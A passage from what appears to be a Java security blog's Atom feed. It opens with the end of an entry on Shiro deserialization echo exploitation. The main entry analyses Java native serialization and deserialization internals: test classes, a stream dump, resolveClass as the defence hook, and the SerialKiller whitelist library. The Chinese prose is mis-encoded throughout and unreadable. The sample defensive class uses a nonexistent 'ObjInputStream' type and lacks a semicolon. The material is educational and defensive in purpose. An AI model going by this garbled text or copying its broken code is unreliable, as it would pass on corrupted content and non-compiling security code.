†å†…å­˜ä¸­çš„socketå¯¹è±¡å®ç°å›æ˜¾â€ï¼Œæˆ‘çŒœå¯ä»¥åœ¨burpé‡Œé¢åˆ©ç”¨çš„æƒ…å†µåº”è¯¥æ˜¯é€šè¿‡æŸç§é»‘é­”æ³•è·å–åˆ°äº†æœ¬æ¬¡è¯·æ±‚çš„socketå¯¹è±¡äº†ï¼ˆæˆ–è€…æ˜¯æ›´åº•å±‚çš„æ–¹æ³•ï¼‰æ‰€ä»¥æ‰ä¸è¦ä»¥å®¢æˆ·ç«¯æºå£ä½œä¸ºè¿‡æ»¤æ¡ä»¶ã€‚</li><li>å†™åˆ°è¿™å¿½ç„¶æƒ³èµ·ï¼Œé‚£ä¸ªå›¾ç‰‡payloadè²Œä¼¼æ²¡æœ‰æ‰“ç ï¼Œæˆ–è®¸æŠŠpayloadç”¨shiroå¸¸è§çš„å¯†é’¥æ’ä¸€ä¸‹æ’å¯ä»¥çœ‹åˆ°æ ‡å‡†ç‰ˆæ€è·¯çš„ç‰‡æ®µï¼Ÿä½“åŠ›ä¸å¤Ÿï¼Œæºœäº†ã€‚</li></ol><p>ç ”ç©¶è¿™ä¸ªé—®é¢˜æ—¶å€™ä¹Ÿè¯·æ•™äº†ç›¸å…³çš„å¤§å“¥æ¥æ”¶åˆ°äº†ä¸€äº›æç¤ºï¼Œå› ä¸ºå±äºä»–äººçŸ¥è¯†äº§æƒï¼Œæ–‡ç« å¹¶æœªæåŠã€‚åœ¨æ­¤è°¢è¿‡æŒ‡ç‚¹æˆ‘çš„å¤§å“¥ä»¬ã€‚</p>]]></content>
    
    <summary type="html">
    
      å…¶å®è¿™ä¸ªæ€è·¯è·ç¦»å®ç°æ ‡é…ç‰ˆçš„æ•ˆæœå°±ä¸€æ­¥ä¹‹é¥äº†ï½
    
    </summary>
    
    
      <category term="web security" scheme="https://cl0und.github.io/categories/web-security/"/>
    
    
      <category term="java" scheme="https://cl0und.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>JavaåŸç”Ÿåºåˆ—åŒ–ä¸ååºåˆ—åŒ–ä»£ç ç®€è¦åˆ†æ</title>
    <link href="https://cl0und.github.io/2020/02/14/Java%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/"/>
    <id>https://cl0und.github.io/2020/02/14/Java%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/</id>
    <published>2020-02-14T03:44:34.000Z</published>
    <updated>2020-07-11T08:03:17.449Z</updated>
    
    <content type="html"><![CDATA[<!-- å†™è¿™ç¯‡æ–‡ç« ç›®çš„ä¸»è¦åœ¨äºè¿›ä¸€æ­¥ç†è§£ä½•ä¸ºjavaåŸç”Ÿååºåˆ—åŒ–ï¼Œå¹¶ä¸”å›ç­”å¦‚ä¸‹çš„å‡ ä¸ªé—®é¢˜ã€‚ --><!-- more --><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å†™è¿™ç¯‡æ–‡ç« ç›®çš„ä¸»è¦åœ¨äºè¿›ä¸€æ­¥ç†è§£ä½•ä¸ºjavaåŸç”Ÿååºåˆ—åŒ–ï¼Œå¹¶ä¸”å›ç­”çš„å‡ ä¸ªé—®é¢˜ã€‚</p><ol><li>ä¸ºä»€ä¹ˆå°±javaååºåˆ—åŒ–ä½¿ç”¨è€Œè¨€æ˜¯ååºåˆ—åŒ–ç±»çš„readObjectå¼€å§‹ï¼Ÿ</li><li>ä¸ºä»€ä¹ˆresolveClassæ–¹æ³•å¯ä»¥é˜²å¾¡ååºåˆ—åŒ–ï¼Ÿ</li><li>ä¸ºä»€ä¹ˆåœ¨ååºåˆ—åŒ–æ•°æ®åé¢æ’å…¥è„æ•°æ®ä¼šä¸ä¼šå½±å“ååºåˆ—åŒ–ï¼Ÿ</li></ol><p><strong>ps: ç¢äºæ°´å¹³æœ‰é™åªä¼šåœ¨ä»£ç è¡¨å±‚åšå®è§‚å’Œä¸­è§‚çš„åˆ†æï¼Œå¹¶ä¸ä¼šæ·±å…¥ç‰¹åˆ«åº•å±‚ã€‚</strong></p><h2 id="æµ‹è¯•ä»£ç "><a href="#æµ‹è¯•ä»£ç " class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h2><p>åºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">int</span> money = <span class="number">100</span>;</span><br><span class="line">    String firstname = <span class="string">"cl0und"</span>;</span><br><span class="line">    String lastname = <span class="string">"lisan"</span>;</span><br><span class="line"></span><br><span class="line">    User()&#123;</span><br><span class="line">        System.out.println(<span class="string">"æ— å‚æ•°æ„é€ æ–¹æ³•"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serial</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectOutputStream oops = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./serializable.txt"</span>));</span><br><span class="line">        oops.writeObject(<span class="keyword">new</span> User());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Unserial</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream oips = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./serializable.txt"</span>));</span><br><span class="line">        User user = (User) oips.readObject();</span><br><span class="line">        System.out.println(user.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h2><h3 id="é¢„å¤„ç†"><a href="#é¢„å¤„ç†" class="headerlink" title="é¢„å¤„ç†"></a>é¢„å¤„ç†</h3><p>é¢„å¤„ç†çš„æ„ä¹‰æ˜¯æ‹¿åˆ°ç±»çš„æè¿°ç¬¦ç±»ObjectStreamClassï¼Œåç»­å¯¹ç±»çš„å†…çœå’Œå†™å…¥åºåˆ—åŒ–æ•°æ®éƒ½ç”±ä»–å®Œæˆæˆ–è°ƒåº¦ã€‚<br><img src="1579071914321-a1cb1263-2c7b-4c2a-ac9e-ab59b368be6f.png#align=left&display=inline&height=268&name=image.png&originHeight=536&originWidth=2218&size=130937&status=done&style=none&width=1109" alt="image.png"></p><p><img src="1579072160993-ddec24eb-7894-4fa4-b0a3-6cc1525d0312.png#align=left&display=inline&height=499&name=image.png&originHeight=998&originWidth=2416&size=312156&status=done&style=none&width=1208" alt="image.png"></p><p><img src="1579072322762-373ead16-c408-4a20-b9c8-0e5afeb526a2.png#align=left&display=inline&height=79&name=image.png&originHeight=118&originWidth=1114&size=24543&status=done&style=none&width=746" alt="image.png"></p><h3 id="åºåˆ—åŒ–æ•°æ®"><a href="#åºåˆ—åŒ–æ•°æ®" class="headerlink" title="åºåˆ—åŒ–æ•°æ®"></a>åºåˆ—åŒ–æ•°æ®</h3><p>å¯ä»¥çœ‹åˆ°ä¸€å…±æœ‰ä¸‰æ­¥ï¼Œé¦–å…ˆæ˜¯TC_OBJECTï¼Œå…¶æ¬¡æ˜¯ç±»çš„å…ƒä¿¡æ¯ï¼Œæœ€åæ˜¯ç±»çš„å…·ä½“æ•°æ®ã€‚<br><img src="1579072894925-2b64c24f-c27e-4076-9680-ff51ad8934d7.png#align=left&display=inline&height=526&name=image.png&originHeight=1052&originWidth=2218&size=309500&status=done&style=none&width=1109" alt="image.png"></p><p>ç¬¬ä¸€æ­¥å°±å†™ä¸ªæ ‡å¿—å¤´ï¼Œæ¯”è¾ƒç®€å•æˆ‘ä»¬ä¸‹é¢ç›´æ¥ä»ç¬¬äºŒæ­¥å¼€å§‹çœ‹ã€‚</p><h4 id="writeClassDesc"><a href="#writeClassDesc" class="headerlink" title="writeClassDesc"></a>writeClassDesc</h4><p>åœ¨åºåˆ—åŒ–å¯¹è±¡çš„æ•°æ®ä¹‹å‰ï¼Œé¦–å…ˆä¼šæœ‰ä¸€ä¸ªå¯¹è±¡ç±»å‹çš„åˆ†ç±»åˆ¤æ–­ï¼Œè¿™é‡Œåˆ†æˆå››ç§ç±»å‹æ¥å¤„ç†å³nullç±»å‹ï¼ˆTC_NULLï¼‰ã€handleç±»å‹ï¼ˆTC_REFERENCEï¼‰ã€ä»£ç†ç±»å‹ï¼ˆTC_PROXYCLASSDESCï¼‰ã€æ™®é€šç±»å‹ï¼ˆTC_CLASSDESCï¼‰ã€‚æˆ‘ä»¬è¿™é‡Œçš„Useræ˜¯æ™®é€šçš„ç±»æ‰€ä»¥èµ°æœ€åçš„writeNonProxyDescã€‚<br><img src="1579072952655-5aaa96e0-5fdf-488a-ac94-8528a696d735.png#align=left&display=inline&height=265&name=image.png&originHeight=530&originWidth=2170&size=158579&status=done&style=none&width=1085" alt="image.png"></p><p>writeNonProxyDescä¼šå…ˆè°ƒç”¨writeClassDescriptoræŠŠè‡ªå·±çš„å±æ€§ä¿¡æ¯å†™å…¥ï¼Œç„¶å<strong>é€’å½’è°ƒç”¨writeClassDescå†™å…¥çˆ¶ç±»å…ƒä¿¡æ¯</strong>ã€‚<br><img src="1579073424200-23b27228-c0e6-4226-87ea-39f9a62cd74a.png#align=left&display=inline&height=456&name=image.png&originHeight=912&originWidth=2570&size=266403&status=done&style=none&width=1285" alt="image.png"></p><p>ç»†çœ‹ä¸€ä¸‹writeClassDescriptorï¼Œè¿™é‡Œé¢ä¼šè°ƒç”¨writeNonProxyã€‚<br><img src="1579073626530-720d0886-3e01-4436-93f9-f965c7280d8b.png#align=left&display=inline&height=121&name=image.png&originHeight=198&originWidth=1220&size=40079&status=done&style=none&width=746" alt="image.png"></p><p>æœ€åè°ƒç”¨writeNonProxyï¼Œåœ¨forå¾ªç¯é‡Œé¢å†™å…¥å±æ€§ä¿¡æ¯ã€‚<br><img src="1579073604762-ebea518b-6e04-4df7-a251-edb41729238d.png#align=left&display=inline&height=612&name=image.png&originHeight=1224&originWidth=1920&size=311877&status=done&style=none&width=960" alt="image.png"></p><p>è¿™ä¸€æ®µçš„å†™å…¥å¦‚æœæœ€åç”¨dumpå‡ºæ¥ï¼Œå°±æ˜¯ä¸‹é¢è¿™ä¸ªæ ·å­ã€‚<br><img src="1579073704276-07463dd6-ef7f-4174-b38b-b7d9f8e3c621.png#align=left&display=inline&height=678&name=image.png&originHeight=1224&originWidth=1346&size=143782&status=done&style=none&width=746" alt="image.png"></p><h4 id="writeSerialData"><a href="#writeSerialData" class="headerlink" title="writeSerialData"></a>writeSerialData</h4><p>æŠŠç±»å±æ€§ä¿¡æ¯å†™å»ä¹‹åï¼Œæ¥ä¸‹æ¥å°±æ˜¯å†™ç±»å±æ€§å¯¹åº”çš„å…·ä½“å€¼äº†ã€‚<img src="1579074696395-fa1ba6b8-6c83-4273-9d87-20620d97374f.png#align=left&display=inline&height=691&name=image.png&originHeight=1382&originWidth=2290&size=431384&status=done&style=none&width=1145" alt="image.png"></p><p><img src="1579075103594-84570cfe-d6c5-477a-aa31-8be9626ab9cd.png#align=left&display=inline&height=734&name=image.png&originHeight=1468&originWidth=2392&size=472323&status=done&style=none&width=1196" alt="image.png"></p><p><em>ps:éåŸç”Ÿæ•°æ®ç±»å‹æŒ‡çš„æ˜¯å­—ç¬¦ä¸²ã€æ•°ç»„ã€æšä¸¾ç±»å‹ã€å¯¹è±¡ã€‚</em><br>_<br>ä¸€ä¸ªå®Œæ•´çš„dumpå¦‚ä¸‹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 4 - 0x00 04</span><br><span class="line">        Value - User - 0x55736572</span><br><span class="line">      serialVersionUID - 0xbb 67 4f fb 9b a9 d6 bb</span><br><span class="line">      newHandle 0x00 7e 00 00</span><br><span class="line">      classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">      fieldCount - 4 - 0x00 04</span><br><span class="line">      Fields</span><br><span class="line">        0:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 3 - 0x00 03</span><br><span class="line">            Value - age - 0x616765</span><br><span class="line">        1:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 5 - 0x00 05</span><br><span class="line">            Value - money - 0x6d6f6e6579</span><br><span class="line">        2:</span><br><span class="line">          Object - L - 0x4c</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 9 - 0x00 09</span><br><span class="line">            Value - firstname - 0x66697273746e616d65</span><br><span class="line">          className1</span><br><span class="line">            TC_STRING - 0x74</span><br><span class="line">              newHandle 0x00 7e 00 01</span><br><span class="line">              Length - 18 - 0x00 12</span><br><span class="line">              Value - Ljava&#x2F;lang&#x2F;String; - 0x4c6a6176612f6c616e672f537472696e673b</span><br><span class="line">        3:</span><br><span class="line">          Object - L - 0x4c</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 8 - 0x00 08</span><br><span class="line">            Value - lastname - 0x6c6173746e616d65</span><br><span class="line">          className1</span><br><span class="line">            TC_REFERENCE - 0x71</span><br><span class="line">              Handle - 8257537 - 0x00 7e 00 01</span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - 0x70</span><br><span class="line">    newHandle 0x00 7e 00 02</span><br><span class="line">    classdata</span><br><span class="line">      User</span><br><span class="line">        values</span><br><span class="line">          age</span><br><span class="line">            (int)20 - 0x00 00 00 14</span><br><span class="line">          money</span><br><span class="line">            (int)100 - 0x00 00 00 64</span><br><span class="line">          firstname</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - 0x74</span><br><span class="line">                newHandle 0x00 7e 00 03</span><br><span class="line">                Length - 6 - 0x00 06</span><br><span class="line">                Value - cl0und - 0x636c30756e64</span><br><span class="line">          lastname</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - 0x74</span><br><span class="line">                newHandle 0x00 7e 00 04</span><br><span class="line">                Length - 5 - 0x00 05</span><br><span class="line">                Value - lisan - 0x6c6973616e</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¸–ç•Œä¸Šæ˜¯å†™å…¥äº†å„å­—æ®µé•¿åº¦çš„ï¼Œæ‰€ä»¥åœ¨åé¢ååºåˆ—åŒ–è¯»çš„æ—¶å€™æ˜¯æŒ‰ç…§å­—æ®µé•¿åº¦æ¥è¿›è¡Œè¯»å–çš„ã€‚<strong>è¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆåœ¨ååºåˆ—åŒ–æ•°æ®åé¢æ’å…¥è„æ•°æ®ä¼šä¸ä¼šå½±å“ååºåˆ—åŒ–</strong>ã€‚</p><h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><h3 id="é¢„å¤„ç†-1"><a href="#é¢„å¤„ç†-1" class="headerlink" title="é¢„å¤„ç†"></a>é¢„å¤„ç†</h3><p>ååºåˆ—åŒ–å’Œåºåˆ—åŒ–äº’ä¸ºç§°æ“ä½œï¼Œå…¶ä¸»è¦çš„æ“ä½œåœ¨readObject0é‡Œé¢<br><img src="1579081394980-e507b22c-1658-4b07-b841-ba11924dcecb.png#align=left&display=inline&height=217&name=image.png&originHeight=434&originWidth=1926&size=114185&status=done&style=none&width=963" alt="image.png"></p><p>caseåˆ°objectè¿›è¡Œååºåˆ—åŒ–ï¼Œæ•´ä¸ªobjectçš„ååºåŒ–åœ¨readOrdinaryObjectä¸­<br><img src="1579081417550-f6a84856-864a-4e96-bbb9-f92cfffeffa2.png#align=left&display=inline&height=62&name=image.png&originHeight=100&originWidth=1202&size=18103&status=done&style=none&width=746" alt="image.png"></p><p>å’Œåºåˆ—åŒ–å¯¹ç§°è¿˜æ˜¯åˆ†ä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥æ˜¯è¯»å–å‡ºç±»çš„å…ƒä¿¡æ¯ï¼ˆreadClassDescï¼‰ï¼Œç¬¬äºŒæ­¥æ˜¯è¯»å–å‡ºå¯¹è±¡å±æ€§å…·ä½“çš„æ•°æ®ï¼ˆreadSerialDataï¼‰ã€‚<br><img src="1579097989089-bb47e454-4a63-4f1f-adba-b23a19fddfdf.png#align=left&display=inline&height=657&name=image.png&originHeight=1314&originWidth=2282&size=361847&status=done&style=none&width=1141" alt="image.png"></p><h3 id="ååºåˆ—åŒ–æ•°æ®"><a href="#ååºåˆ—åŒ–æ•°æ®" class="headerlink" title="ååºåˆ—åŒ–æ•°æ®"></a>ååºåˆ—åŒ–æ•°æ®</h3><h4 id="readClassDesc"><a href="#readClassDesc" class="headerlink" title="readClassDesc"></a>readClassDesc</h4><p>åœ¨åºåˆ—åŒ–é‚£é‡Œæåˆ°è¿‡ï¼Œå¯¹æŠŠç±»ç±»å‹åˆ†æˆå››ä¸ªç±»å‹å¤„ç†ï¼Œè¿™é‡Œçš„Useræ˜¯éä»£ç†æ™®é€šç±»ï¼Œå°±èµ°readNonProxyDescã€‚<br><img src="1579098107741-afcde48d-8a7a-4d1f-83be-c826002ecee5.png#align=left&display=inline&height=525&name=image.png&originHeight=1050&originWidth=2250&size=280701&status=done&style=none&width=1125" alt="image.png"></p><p>readNonProxyDescä¸­ä¸»è¦çš„æ“ä½œåœ¨readClassDescriptorã€resolveClassã€initNonProxyï¼ˆ<strong>æ³¨æ„è¿™é‡ŒinitNonProxyçš„æœ€åä¸€ä¸ªä¼ å‚ï¼Œè¿™é‡Œé€’å½’è°ƒç”¨äº†readClassDesc</strong>ï¼‰ã€‚<br><img src="1579098941907-9785fe5c-79de-442c-9632-f8366c6f50bc.png#align=left&display=inline&height=762&name=image.png&originHeight=1524&originWidth=2322&size=485982&status=done&style=none&width=1161" alt="image.png"></p><p>readClassDescriptorè¯»å‡ºäº†ç±»çš„å…ƒæ•°æ®å¹¶æŠŠæ¯ä¸€ä¸ªå±æ€§åæŠ½è±¡æˆäº†ObjectStreamFieldç±»<br><img src="1579098457484-d2b7c5d1-7498-4b1b-84fb-4697e163e69c.png#align=left&display=inline&height=744&name=image.png&originHeight=1488&originWidth=2144&size=459960&status=done&style=none&width=1072" alt="image.png"></p><p>resolveClasså¯¹ç±»ç±»å‹è¿›è¡Œäº†æ„å»ºï¼Œæ³¨æ„è¿™é‡Œç¬¬äºŒå‚æ•°ä¸ºfalseï¼Œæ„å‘³ç€å¹¶ä¸ä¼šæ‰§è¡Œç±»çš„åˆå§‹åŒ–ï¼ˆstaticä»£ç å—ä¸æ‰§è¡Œï¼‰<br>ã€‚</p><p><img src="1579098865240-c1eebc8c-097a-4c4b-a621-fa41f37583a1.png#align=left&display=inline&height=293&name=image.png&originHeight=586&originWidth=2098&size=135558&status=done&style=none&width=1049" alt="image.png"></p><p><strong>å¦å¤–æ³¨æ„è¿™é‡Œè§£é‡Šäº†ä¸ºä»€ä¹ˆè®¾ç½®ååºåˆ—åŒ–é˜²å¾¡çš„ç‚¹æ˜¯åœ¨resolveClassï¼Œå¦‚æœæƒ³å¯¹ååºåˆ—åŒ–è®¾ç½®é˜²å¾¡ï¼Œå°±éœ€è¦è‡ªå·±å®ç°ä¸€ä¸ªObjectInputStreamã€‚</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObjInputStream</span> <span class="keyword">extends</span> <span class="title">ObjInputStream</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyObjInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjInputStream desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">"defence"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(desc)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>initNonProxyåˆæ„å»ºäº†ç±»çš„å…ƒä¿¡æ¯ã€‚<br><img src="1579099519793-d21fcdc2-bccf-411c-bef1-5e517f4e508f.png#align=left&display=inline&height=474&name=image.png&originHeight=948&originWidth=1518&size=180999&status=done&style=none&width=759" alt="image.png"></p><p>æœ€ådescï¼ˆObjectStreamClassï¼‰ä¼ å‡ºç»™å¤–å±‚readOrdinaryObjectã€‚é¦–å…ˆä¼šè¿›è¡Œå¯¹è±¡çš„åˆå§‹åŒ–ï¼Œç„¶åè¯»å‡ºæ•°æ®æ³¨å…¥ç±»ä¸­ã€‚<br><img src="1579099650702-8f1fa375-96f9-4d7e-86e2-f6e25abf5621.png#align=left&display=inline&height=355&name=image.png&originHeight=710&originWidth=1720&size=154285&status=done&style=none&width=860" alt="image.png"></p><h4 id="readSerialData"><a href="#readSerialData" class="headerlink" title="readSerialData"></a>readSerialData</h4><p>å¦‚æœæˆ‘ä»¬è‡ªå®šä¹‰äº†readObjectæ–¹æ³•ï¼Œé‚£ä¹ˆè¿™é‡Œå°±ä¼šinvokeï¼Œ<strong>è¿™é‡Œè§£é‡Šäº†ä¸ºä»€ä¹ˆå°±javaååºåˆ—åŒ–ä½¿ç”¨è€Œè¨€æ˜¯ååºåˆ—åŒ–ç±»çš„readObjectå¼€å§‹ã€‚</strong><br><img src="1579101128866-30f3281e-d43c-4033-aa18-e81302113c73.png#align=left&display=inline&height=435&name=image.png&originHeight=870&originWidth=2158&size=270819&status=done&style=none&width=1079" alt="image.png"></p><p>ä½†æ˜¯åœ¨Userç±»ä¸­åœ¨æˆ‘ä»¬å¹¶æ²¡æœ‰è‡ªå®šä¹‰ååºåˆ—åŒ–æ–¹æ³•éšæ„è¿˜æ˜¯èµ°é»˜è®¤è·¯çº¿ã€‚<br><img src="1579099806423-394e2869-54a0-41a1-ab91-84de80fde8de.png#align=left&display=inline&height=548&name=image.png&originHeight=1096&originWidth=2446&size=295874&status=done&style=none&width=1223" alt="image.png"></p><p>defaultReadFieldsï¼Œä¸­ç¬¬ä¸€ä¸ªå¾ªç¯æŠŠåŸç”Ÿç±»å‹æ•°æ®èµ‹ç»™objï¼Œç¬¬äºŒä¸ªå¾ªç¯æŠŠæ•°ç»„ã€æšä¸¾ç±»å‹ã€å¯¹è±¡ç±»å‹èµ‹ç»™objã€‚<br><img src="1579099910627-5e87fc03-44b5-4eca-a2e2-3d75b83f0fd8.png#align=left&display=inline&height=632&name=image.png&originHeight=1264&originWidth=2000&size=336960&status=done&style=none&width=1000" alt="image.png"></p><p>è¡¥å……ä¸€å¼ æ•´ä¸ªååºåˆ—åŒ–çš„æ—¶åºå›¾ã€‚<br><img src="1579141111812-93300e7b-b9e9-4e5c-a4d7-640bb1a38793.png#align=left&display=inline&height=801&name=image.png&originHeight=1602&originWidth=2582&size=1407262&status=done&style=none&width=1291" alt="image.png"></p><h2 id="ä»SerialKilleræ¥javaååºåˆ—åŒ–é˜²å¾¡"><a href="#ä»SerialKilleræ¥javaååºåˆ—åŒ–é˜²å¾¡" class="headerlink" title="ä»SerialKilleræ¥javaååºåˆ—åŒ–é˜²å¾¡"></a>ä»SerialKilleræ¥javaååºåˆ—åŒ–é˜²å¾¡</h2><p><a href="https://github.com/ikkisoft/SerialKiller">https://github.com/ikkisoft/SerialKiller</a><br>åŸç”Ÿä½¿ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(is);</span><br><span class="line">String msg = (String) ois.readObject();</span><br></pre></td></tr></table></figure><p>åŠ ä¸ŠSerialKilleråçš„ä½¿ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream ois = <span class="keyword">new</span> SerialKiller(is, <span class="string">"/etc/serialkiller.conf"</span>);</span><br><span class="line">String msg = (String) ois.readObject();</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å®ƒçš„åŸç†å°±æ˜¯ä¸Šé¢æçš„è‡ªå·±å®ç°æµå¹¶ä¸”åœ¨resolveClasså¤„åŠ ä¸Šç™½åå•æˆ–è€…é»‘åå•çš„è¿‡æ»¤ã€‚<br><img src="1581650629068-43309a6e-425b-40e0-a375-61538f1648db.png#align=left&display=inline&height=786&name=image.png&originHeight=1572&originWidth=2024&size=259760&status=done&style=none&width=1012" alt="image.png"></p><h2 id="æ‚"><a href="#æ‚" class="headerlink" title="æ‚"></a>æ‚</h2><p>å½“çˆ¶å­æ¥å£åŒæ—¶å®ç°äº†Serializableæ¥å£æ—¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 